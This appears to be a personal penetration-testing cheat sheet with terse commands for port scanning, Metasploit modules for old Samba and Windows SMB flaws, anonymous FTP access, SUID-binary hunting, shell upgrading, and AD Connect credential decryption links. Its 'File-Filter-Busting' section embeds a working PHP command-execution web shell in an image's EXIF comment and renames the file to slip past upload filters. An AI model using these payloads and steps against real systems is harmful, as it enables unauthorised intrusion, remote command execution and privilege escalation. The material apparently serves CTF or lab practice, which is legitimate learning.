# Recon
Scan aggresivly on all ports with OS detection, version detection, script scanning and traceroute and write to file
```
nmap -p- -T4 -oN <outfile> -A <IP>
```

# Metasploit
local_exploit_suggester is really helpfull, but only on x86

## Correlation

Service | CVE | MSF-Module
--- | --- | ---
Samba 3.0.20 | [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) | exploit/multi/samba/usermap_script
Windows <7| [CVE-2008-4250](https://nvd.nist.gov/vuln/detail/CVE-2008-4250) | exploit/windows/smb/ms08_067_netapi


# FTP
Try 
```
ftp <ip>
```
and use "anonymous" as name.

# Local Priv Esc
https://gtfobins.github.io/

# File-Filter-Busting

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg

Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file

mv lo.jpg lo.php.jpg
```
https://github.com/xapax/security/blob/master/bypass_image_upload.md


# Interactive Python pty
`python3 -c 'import pty; pty.spawn("/bin/sh")'`


# Sticky-Bit
```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

# Exploit via Path if SUID-Binary does not use full path
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/

# SMB-Enum
enum4linux

# AzureAD
https://github.com/VbScrub/AdSyncDecrypt/releases
https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/

# Windows-RPC-Service
https://nmap.org/nsedoc/scripts/nfs-showmount.html
